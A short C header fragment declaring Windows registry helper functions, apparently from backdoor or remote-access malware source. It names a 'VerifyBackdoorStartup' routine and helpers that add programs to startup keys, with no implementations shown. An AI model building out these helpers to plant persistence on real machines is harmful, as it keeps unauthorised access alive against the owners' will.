/*************
** Function **
*************/
BOOL registry_CreateKey		(HKEY hKey, char *pszSubKey, char *pszKey);
BOOL registry_DeleteKey		(HKEY hKey, char *pszSubKey, char *pszKey);
BOOL registry_DeleteValue	(HKEY hKey, char *pszSubKey, char *pszValueName);
BOOL registry_ReadValue		(HKEY hKey, char *pszSubKey, char *pszValueName, void *pBuffer, DWORD dwSize);
BOOL registry_WriteWord		(HKEY hKey, char *pszSubKey, char *pszValueName, DWORD dwValue);
BOOL registry_WriteString	(HKEY hKey, char *pszSubKey, char *pszValueName, char *pszValue);
BOOL registry_VerifyBackdoorStartup(char *pszFilePath);
BOOL registry_AddExeStartup	(char *pszCmdLine);
BOOL registry_AddCommonStartup		(char *pszKeyName, char *pszCmdLine);